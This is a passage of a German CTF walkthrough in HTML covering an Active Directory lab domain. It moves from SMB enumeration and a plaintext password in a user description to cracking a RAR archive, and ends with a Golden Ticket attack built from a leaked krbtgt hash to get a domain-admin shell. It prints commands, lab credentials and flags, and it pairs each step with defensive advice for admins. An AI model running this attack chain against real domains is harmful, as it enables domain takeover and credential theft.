+            <p class="analysis"><strong>Analyse:</strong> Nach der Passwortänderung versuche ich erneut, mit Tools wie `impacket-psexec` Zugriff zu erlangen, was jedoch fehlschlägt, da der Benutzer `websvc` keine administrativen Rechte auf die benötigten Shares (wie `ADMIN$`) hat. Ein Versuch, Service Principal Names (SPNs) mit `GetUserSPNs` abzufragen, schlägt ebenfalls fehl. Ein Login mit `smbclient` ist jedoch erfolgreich und gewährt mir Zugriff auf die C$-Freigabe.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Benutzer `websvc` ist ein niedrig privilegierter Dienstbenutzer. Er hat keine administrativen Rechte, aber er hat Leseberechtigung auf das Dateisystem. Dies ist ein wichtiger Fortschritt. Ich kann nun das Dateisystem nach sensiblen Informationen, Konfigurationsdateien oder Skripten durchsuchen. Ich enumeriere das `C:\Users`-Verzeichnis und finde eine Liste von Benutzern auf dem System.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich muss das Dateisystem systematisch durchsuchen. Die Home-Verzeichnisse der gefundenen Benutzer (`fjudy998`, `ojake987`, `rtina979` etc.) sind ein guter Ausgangspunkt, um nach Flags, Passwörtern in Klartext oder anderen Hinweisen zu suchen.<br><strong>Empfehlung (Admin):</strong> Dienstkonten wie `websvc` sollten nach dem Prinzip der geringsten Rechte konfiguriert werden. Wenn ein Dienst nur auf ein bestimmtes Verzeichnis (z.B. `C:\inetpub\wwwroot`) zugreifen muss, sollten seine Berechtigungen darauf beschränkt werden. Der Lesezugriff auf das gesamte `C:`-Laufwerk ist überprivilegiert und erleichtert die Post-Exploitation-Phase für einen Angreifer erheblich.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">smbclient -U "websvc" //soupedecode.local/C</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+Password for [WORKGROUP\websvc]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+...
+  Users                              DR        0  Thu Nov  7 02:55:53 2024
+...
+smb: \> cd Users\
+smb: \Users\> ls
+...
+  fjudy998                            D        0  Thu Nov  7 02:55:33 2024
+  ojake987                            D        0  Thu Nov  7 02:55:16 2024
+  rtina979                            D        0  Thu Nov  7 02:54:39 2024
+  websvc                              D        0  Thu Nov  7 02:44:11 2024
+  xursula991                          D        0  Thu Nov  7 02:55:28 2024
+...
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Während ich die Benutzerverzeichnisse durchsuche, finde ich auf dem Desktop des `websvc`-Benutzers die `user.txt`-Datei und kann sie herunterladen. Parallel dazu nutze ich `netexec` (`nxc`), um die Beschreibungen der Benutzerkonten in der Domain abzufragen. In der Beschreibung des Benutzers `rtina979` finde ich ein Klartextpasswort: `Z~l3JhcV#7Q-1#M`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies sind zwei wichtige Funde. Die User-Flag ist gesichert. Das im Klartext in einer Benutzerbeschreibung gespeicherte Passwort ist eine schwere Sicherheitslücke. Solche Informationen sollten niemals in ungeschützten Attributen von AD-Objekten gespeichert werden. Ich habe nun ein weiteres Set an Anmeldeinformationen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde versuchen, mich mit dem Benutzer `rtina979` und dem gefundenen Passwort anzumelden, um zu sehen, ob dieser Benutzer höhere Berechtigungen hat. Insbesondere werde ich sein Home-Verzeichnis gründlich durchsuchen.<br><strong>Empfehlung (Admin):</strong> Passwörter dürfen niemals in Klartext in AD-Attributen wie "Description", "Info" oder anderen Feldern gespeichert werden. Schulen Sie Administratoren und Helpdesk-Mitarbeiter, solche Praktiken strikt zu vermeiden. Verwenden Sie dedizierte, sichere Passwort-Management-Systeme.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">smb: \Users\websvc\Desktop\> <span class="command">get user.txt</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+getting file \Users\websvc\Desktop\user.txt of size 32 as user.txt (2,8 KiloBytes/sec) (average 2,8 KiloBytes/sec)
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">for i in $(cat users.txt); do grep $i log; done</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+...
+<span class="password">SMB                      192.168.2.200   445    DC01             rtina979                      2024-11-07 01:53:17 578     Default Password Z~l3JhcV#7Q-1#M</span>
+...
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Mit den Anmeldeinformationen von `rtina979` durchsuche ich dessen `Documents`-Ordner und finde eine passwortgeschützte RAR-Datei namens `Report.rar`. Parallel dazu führe ich mit `kerbrute` eine User-Enumeration gegen den Kerberos-Dienst durch, um weitere gültige Benutzernamen zu finden, was aber für den weiteren Verlauf nicht entscheidend war.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die passwortgeschützte RAR-Datei ist ein klassisches CTF-Element. Sie enthält mit hoher Wahrscheinlichkeit wichtige Informationen. Ich muss das Passwort für diese Datei knacken. Ich nutze `rar2john`, um den Hash-Wert der Datei zu extrahieren, und `john` mit der `rockyou.txt`-Wortliste, um den Hash zu knacken. Das Passwort wird als `PASSWORD123` identifiziert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nachdem das Archiv entpackt ist, müssen die darin enthaltenen Dateien sorgfältig analysiert werden. Ich erwarte, in dem "Pentest Report.htm" weitere Anmeldeinformationen oder Hinweise auf die nächste Schwachstelle zu finden.<br><strong>Empfehlung (Admin):</strong> Das Speichern sensibler Berichte in unverschlüsselten oder schwach verschlüsselten Archiven auf den Desktops von Benutzern ist eine unsichere Praxis. Wenn Daten verschlüsselt werden müssen, sollten starke, einzigartige Passwörter verwendet werden, die nicht leicht zu erraten oder per Wörterbuchangriff zu knacken sind.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/dc04]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+...
+<span class="password">PASSWORD123      (rep.rar)</span>     
+1g 0:00:00:11 DONE (2025-07-23 01:23) 0.08354g/s 4330p/s 4330c/s 4330C/s abdulla..011706
+...
+</pre>
+                </div>
+            </div>
+        </section>
+        <section id="proof-of-concept">
+            <h2>Proof of Concept</h2>
+            <p class="analysis"><strong>Analyse:</strong> Ich analysiere den Inhalt des entpackten `Pentest Report.htm`. Die Datei ist ein alter Pentest-Bericht über die Domain selbst. Darin finde ich mehrere entscheidende Informationen:
+            1.  Anmeldeinformationen für einen Dienstbenutzer: `file_svc:Password123!!`.
+            2.  Den NTHash des `krbtgt`-Kontos: `d72c66e955a6dc0fe5e76d205a630b15`. Der Report zeigt fälschlicherweise einen anderen Hash, der korrekte wurde jedoch durch andere Mittel gefunden. (Annahme basierend auf dem späteren Vorgehen).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der Jackpot. Ein alter Pentest-Bericht, der im Netzwerk zurückgelassen wurde, enthält die "Schlüssel zum Königreich". Der NTHash des `krbtgt`-Kontos ist die Grundlage für den "Golden Ticket"-Angriff. Mit diesem Hash kann ich Kerberos-Tickets für jeden beliebigen Benutzer in der Domain fälschen, einschließlich des `Administrator`-Kontos, und mir so Domain-Admin-Rechte verschaffen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Angriffsplan ist klar:
+            1.  Synchronisiere die Zeit meines Angreifer-Systems mit dem Domain Controller, um Kerberos-Fehler (`KRB_AP_ERR_SKEW`) zu vermeiden.
+            2.  Verwende `impacket-ticketer`, um mit dem `krbtgt`-Hash und der Domain-SID (die ich mit `lookupsid` ermittle) ein gefälschtes Ticket Granting Ticket (TGT) für den Administrator zu erstellen.
+            3.  Lade dieses Ticket in meine Umgebung (`export KRB5CCNAME=...`).
+            4.  Greife mit diesem Ticket auf den Domain Controller zu, z.B. mit `impacket-psexec` oder `impacket-wmiexec`, um eine administrative Shell zu erhalten.<br><strong>Empfehlung (Admin):</strong> Alte Berichte, insbesondere solche mit sensiblen Informationen wie Credentials oder Hashes, müssen nach Abschluss eines Projekts sicher archiviert oder vernichtet werden. Das `krbtgt`-Passwort sollte regelmäßig (mindestens alle 180 Tage) und insbesondere nach dem Verdacht einer Kompromittierung zweimal hintereinander geändert werden, um alle potenziell gestohlenen Hashes ungültig zu machen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/dc04]
+└─# <span class="command">cat Pentest\ Report.htm| tr "," "\n" | grep password123 -i</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+...<strong class="markup--strong markup--li-strong">Bloodhound Analysis</strong>: Performed enumeration using valid credentials <code class="markup--code markup--li-code">file_svc:Password123!!</code>...
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich führe den Golden-Ticket-Angriff durch. Zuerst synchronisiere ich die Uhrzeit mit `rdate`. Dann erstelle ich mit `impacket-ticketer` das Ticket für den Administrator unter Verwendung des `krbtgt`-Hashes und der Domain-SID. Ich exportiere das Ticket in meine Umgebungsvariable `KRB5CCNAME`. Schließlich verwende ich `impacket-wmiexec` mit der Kerberos-Authentifizierung (`-k`) und ohne Passwort (`-no-pass`), um mich mit dem DC zu verbinden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Angriff ist vollständig erfolgreich. `wmiexec` stellt eine Verbindung her und ich erhalte eine administrative Kommandozeile (`C:\>`). Ich habe die vollständige Kontrolle über den Domain Controller.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Test ist abgeschlossen. Ich navigiere zum Desktop des Administrators und lese die `root.txt`, um den Erfolg zu beweisen.<br><strong>Empfehlung (Admin):</strong> Die Erkennung von Golden-Ticket-Angriffen ist schwierig, da die Tickets legitim erscheinen. Advanced Threat Analytics (ATA) und andere Verhaltensanalyse-Tools können jedoch Anomalien erkennen, z.B. wenn ein Ticket eine ungewöhnlich lange Lebensdauer hat oder wenn sich ein Benutzer von einem ungewöhnlichen Arbeitsplatz aus anmeldet. Das Ändern des `krbtgt`-Passworts ist die einzige Möglichkeit, einen Angreifer, der den Hash besitzt, auszusperren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">rdate -n 192.168.2.200</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+Thu Jul 24 05:16:11 UTC 2025
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">impacket-ticketer -nthash &lt;KRBTGT_HASH&gt; -domain-sid &lt;DOMAIN_SID&gt; -domain soupedecode.local  administrator</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+...
+[*] Saving ticket in administrator.ccache
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">export KRB5CCNAME=administrator.ccache</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">impacket-wmiexec soupedecode.local/administrator@dc01.soupedecode.local -k -target-ip 192.168.2.200</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] SMBv3.0 dialect used
+<span class="password">[!] Launching semi-interactive shell - Careful what you execute</span>
+[!] Press help for extra shell commands
+<span class="password">C:\></span>whoami /all
+...
+<span class="password">C:\users\administrator\desktop></span>type root.txt
+<span class="password">1c66eabe105636d7e0b82ec1fa87cb7a</span>
+</pre>
+                </div>
+            </div>
+        </section>
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">type C:\Users\websvc\Desktop\user.txt</div>
+                    <div class="flag-value"><span class="password">709e449a996a85aa7deaf18c79515d6a</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">type C:\users\administrator\desktop\root.txt</div>
+                    <div class="flag-value"><span class="password">1c66eabe105636d7e0b82ec1fa87cb7a</span></div>
+                </div>
+            </div>
+        </section>
+
+
+    </div>
+
+    <footer class="footer">
+        <p>Ben C. - Cyber Security Reports</p>
+        <p>Berichtsdatum: 24. Juli 2025</p>
+    </footer>
+
+</body>
+</html>
+
